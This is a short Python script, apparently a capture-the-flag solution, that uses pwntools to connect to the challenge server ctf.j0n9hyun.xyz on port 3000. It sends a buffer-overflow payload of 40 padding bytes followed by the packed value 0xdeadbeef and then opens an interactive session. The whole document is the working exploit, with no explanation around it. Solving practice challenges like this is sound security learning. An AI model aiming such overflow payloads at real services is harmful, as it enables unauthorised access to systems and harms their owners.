from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3000)

payload = ''
payload += 'A'*40
payload += p32(0xdeadbeef)

p.send(payload)
p.interactive()